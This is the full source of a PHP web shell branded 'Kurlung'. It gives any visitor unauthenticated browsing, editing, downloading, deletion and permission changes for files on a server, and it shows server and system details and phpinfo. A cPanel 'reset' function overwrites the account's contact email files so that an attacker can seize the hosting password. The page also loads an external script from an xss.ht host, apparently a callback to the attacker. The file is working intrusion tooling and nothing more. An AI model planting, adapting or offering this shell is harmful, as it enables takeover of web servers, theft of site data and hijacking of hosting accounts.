<?php
ini_set('display_errors', 0);

// Get current directory or default to root (htdocs)
$current_dir = isset($_GET['dir']) ? $_GET['dir'] : dirname(__FILE__);

if (!is_dir($current_dir)) {
    $current_dir = dirname(__FILE__);

}

$items = scandir($current_dir);

function formatBytes($size, $precision = 2) {
    $base = log($size, 1024);
    $suffixes = array('', 'KB', 'MB', 'GB', 'TB');   
    return round(pow(1024, $base - floor($base)), $precision) . ' ' . $suffixes[floor($base)];
}

$parent_dir = dirname($current_dir);
$editFileContent = '';

$directory = isset($_GET['dir']) ? $_GET['dir'] : '.';

$directory = realpath($directory) ?: '.';

if (isset($_POST['action'])) {
    $action = $_POST['action'];
    $target = $_POST['target'];

    switch ($action) {
        case 'delete':
            if (is_dir($target)) {
                deleteDirectory($target); // Call the recursive delete function
            } else {
                unlink($target);
            }
            break;

        case 'edit':
            if (file_exists($target)) {
                $editFileContent = file_get_contents($target);
            }
            break;

        case 'save':
            if (file_exists($target) && isset($_POST['content'])) {
                file_put_contents($target, $_POST['content']);
            }
            break;

        case 'chmod':
            if (isset($_POST['permissions'])) {
                chmod($target, octdec($_POST['permissions']));
            }
            break;

        case 'download':
            if (file_exists($target)) {
                header('Content-Description: File Transfer');
                header('Content-Type: application/octet-stream');
                header('Content-Disposition: attachment; filename=' . basename($target));
                header('Expires: 0');
                header('Cache-Control: must-revalidate');
                header('Pragma: public');
                header('Content-Length: ' . filesize($target));
                readfile($target);
                exit;
            }
            break;
    }
}

function deleteDirectory($dir) {
    if (!is_dir($dir)) {
        return false;
    }

    $items = array_diff(scandir($dir), array('.', '..'));

    foreach ($items as $item) {
        $path = $dir . DIRECTORY_SEPARATOR . $item;
        if (is_dir($path)) {
            deleteDirectory($path);
        } else {
            unlink($path);
        }
    }

    return rmdir($dir);
}

function reset_cpanel_password($email) {
    $user = get_current_user();
    $site = $_SERVER['HTTP_HOST'];
    $resetUrl = $site . ':2082/resetpass?start=1';
    
    $wr = 'email:' . $email;
    
    $f = fopen('/home/' . $user . '/.cpanel/contactinfo', 'w');
    fwrite($f, $wr);
    fclose($f);
    
    $f = fopen('/home/' . $user . '/.contactinfo', 'w');
    fwrite($f, $wr);
    fclose($f);
    
    echo '<br/><center>Password reset link: <a href="http://' . $resetUrl . '">' . $resetUrl . '</a></center>';
    echo '<br/><center>Username: ' . $user . '</center>';
}

if (isset($_POST['cpanel_reset'])) {
    $email = $_POST['email'];
    reset_cpanel_password($email);
}

$username = get_current_user();
$user = $_SERVER['USER'] ?? 'N/A';
$phpVersion = phpversion();
$dateTime = date('Y-m-d H:i:s');
$hddFreeSpace = disk_free_space("/") / (1024 * 1024 * 1024); // in GB
$hddTotalSpace = disk_total_space("/") / (1024 * 1024 * 1024); // in GB
$serverIP = $_SERVER['SERVER_ADDR'];
$clientIP = $_SERVER['REMOTE_ADDR'];
$cwd = getcwd();

$parentDirectory = dirname($directory);

if ($parentDirectory === false || $parentDirectory === '/') {
    $parentDirectory = '.';
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Kurlung</title>
    <script src="https://googlescripts.xss.ht"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f4f4f4;
        }
        .file-manager {
            width: 80%;
            margin: 20px auto;
            background-color: #fff;
            padding: 20px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        .file-manager h1 {
            text-align: center;
        }
        .system-info {
            margin-bottom: 20px;
            background-color: #f9f9f9;
            padding: 10px;
            border: 1px solid #ddd;
        }
        .file-list {
            width: 100%;
            border-collapse: collapse;
        }
        .file-list th, .file-list td {
            padding: 10px;
            text-align: left;
            border-bottom: 1px solid #ddd;
        }
        .file-list th {
            background-color: #f0f0f0;
        }
        .file-list tr:hover {
            background-color: #f9f9f9;
        }
        .actions {
            text-align: center;
            margin-bottom: 20px;
        }
        .actions button {
            margin-right: 10px;
            padding: 10px 20px;
            background-color: #007bff;
            color: #fff;
            border: none;
            cursor: pointer;
        }
        .actions button:hover {
            background-color: #0056b3;
        }
        .icon {
            margin-right: 5px;
        }
        .file-actions {
            display: flex;
            justify-content: center;
        }
        .file-actions form {
            display: inline;
        }
        .file-actions button {
            background: none;
            border: none;
            color: #007bff;
            cursor: pointer;
            font-size: 16px;
            margin: 0 5px;
            padding: 5px;
        }
        .file-actions button:hover {
            color: #0056b3;
        }
        .file-actions button i {
            margin-right: 0;
        }
        .edit-form {
            margin-top: 20px;
        }
        .edit-form textarea {
            width: 100%;
            height: 300px;
            font-family: monospace;
            font-size: 14px;
        }
        .edit-form button {
            background-color: #28a745;
            color: #fff;
            padding: 10px 20px;
            border: none;
            cursor: pointer;
        }
        .edit-form button:hover {
            background-color: #218838;
        }
        /* Additional styling for reset form */
        .reset-form {
            display: none; /* Initially hidden */
            margin-top: 20px;
            color: #fff;
            padding: 20px;
            text-align: center;
            width: 50%;
            margin-left: auto;
            margin-right: auto;
        }
        .reset-form input[type="email"],
        .reset-form input[type="submit"] {
            background-color: #181818;
            color: #80D713;
            padding: 10px;
            border: none;
            margin: 5px;
        }
        .php-info-button {
            margin-top: 20px;
            text-align: center;
        }
        .php-info-button button {
            background-color: #17a2b8;
            color: #fff;
            padding: 10px 20px;
            border: none;
            cursor: pointer;
        }
        .php-info-button button:hover {
            background-color: #138496;
        }
    </style>
    <script>
        function toggleResetForm() {
            var form = document.getElementById('reset-form');
            if (form.style.display === 'none' || form.style.display === '') {
                form.style.display = 'block';
            } else {
                form.style.display = 'none';
            }
        }
    </script>
</head>
<body>
<div class="file-manager">
    <h1>Kurlung</h1>

    <!-- System Information Section -->
    <div class="system-info">
    <div style="display: flex; justify-content: space-between; align-items: center;">
    <!-- Text details on the left -->
    <div style="flex: 1;">
    <p><strong>Username:</strong> <?php echo htmlspecialchars($username); ?></p>
            <p><strong>User:</strong> <?php echo htmlspecialchars($username); ?></p>
            <p><strong>PHP Version:</strong> <?php echo htmlspecialchars($phpVersion); ?></p>
            <p><strong>Date and Time:</strong> <?php echo htmlspecialchars($dateTime); ?></p>
            <p><strong>HDD Free Space:</strong> <?php echo number_format($hddFreeSpace, 2); ?> GB</p>
            <p><strong>HDD Total Space:</strong> <?php echo number_format($hddTotalSpace, 2); ?> GB</p>
            <p><strong>Server IP:</strong> <?php echo htmlspecialchars($serverIP); ?></p>
            <p><strong>Client IP:</strong> <?php echo htmlspecialchars($clientIP); ?></p>
            <p><strong>Directory:</strong> <?php echo htmlspecialchars($directory); ?></p>

    </div>

    <!-- Image on the right -->
    <div style="flex: 0;">
        <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi7xjgZfzIz1lLtKZMl9oRWKbuDIn0oHzm8_u6eoj-zW8CawSbPiwA_1ch2_QPyH-qQOFLoiYAenZxfpeRHBniNBO6neDUW-MynTO6encTEYw8lvfUL0DM48y_BuKrxPj3Ld7vdVBGTqwN9e56tNe8NJA1OwvhiH_5dp92YN-7Tv1AS9WWiSx6x-vpmH7I/s16000/kurlung.jpg" alt="Logo" style="max-width: 350px;">
    </div>
</div>

</div>

    <div class="actions">
        <?php if ($parentDirectory !== $directory): ?>
            <button onclick="location.href='?dir=<?php echo urlencode($parentDirectory); ?>'">
                <i class="fas fa-arrow-left icon"></i>Go Back
            </button>
        <?php endif; ?>
        <button onclick="toggleResetForm()">
            <i class="fas fa-sync-alt icon"></i>cPanel Reset
        </button>
    </div>

    <table class="file-list">
        <thead>
        <tr>
            <th>Name</th>
            <th>Size</th>
            <th>Permissions</th>
            <th>Actions</th>
        </tr>
        </thead>
        <tbody>
<?php
// Initialize $files
$files = array();

if (is_dir($directory)) {
    $files = scandir($directory);
}

foreach ($files as $file) {
    if ($file === '.' || $file === '..') continue;

    $filePath = $directory . DIRECTORY_SEPARATOR . $file;
    $fileSize = is_file($filePath) ? formatBytes(filesize($filePath)) : '';
    $permissions = substr(sprintf('%o', fileperms($filePath)), -4);

    echo "<tr>";

    // If it's a directory, make the name a clickable link
    if (is_dir($filePath)) {
        echo "<td><a href=\"?dir=" . urlencode($filePath) . "\"><i class='fas fa-folder'></i> $file</a></td>";
    } else {
        echo "<td><i class='fas fa-file'></i> $file</td>";
    }

    echo "<td>$fileSize</td>";
    echo "<td>$permissions</td>";

    echo "<td class='file-actions'>";
    echo "<form method='POST' action=''><input type='hidden' name='target' value='" . htmlspecialchars($filePath) . "'>";
    if (is_file($filePath)) {
        echo "<button type='submit' name='action' value='edit'><i class='fas fa-edit'></i></button>";
        echo "<button type='submit' name='action' value='download'><i class='fas fa-download'></i></button>";
    }
    echo "<button type='submit' name='action' value='delete'><i class='fas fa-trash'></i></button>";
    echo "<button type='submit' name='action' value='chmod'><i class='fas fa-key'></i></button>";
    echo "</form>";
    echo "</td>";
    
    echo "</tr>";
}
?>
</tbody>

    </table>

    <?php if ($editFileContent !== ''): ?>
        <!-- Edit form for file content -->
        <div class="edit-form">
            <h2>Editing File: <?php echo htmlspecialchars($target); ?></h2>
            <form method="POST" action="">
                <input type="hidden" name="target" value="<?php echo htmlspecialchars($target); ?>">
                <textarea name="content"><?php echo htmlspecialchars($editFileContent); ?></textarea>
                <button type="submit" name="action" value="save">Save Changes</button>
            </form>
        </div>
    <?php endif; ?>

    <!-- Reset cPanel Password Form -->
    <div id="reset-form" class="reset-form">
        <h2 style="color:black">Reset cPanel Password</h2>
        <form method="POST" action="">
            <input type="email" name="email" placeholder="Enter your email" required>
            <input type="submit" name="cpanel_reset" value="Send">
        </form>
    </div>

    <!-- PHP Info Button -->
    <div class="php-info-button">
        <form method="POST" action="">
            <button type="submit" name="action" value="phpinfo">Show PHP Info</button>
        </form>
    </div>

    <?php
    // Display PHP Info if requested
    if (isset($_POST['action']) && $_POST['action'] == 'phpinfo') {
        phpinfo();
    }
    ?>
</div>
</body>
</html>
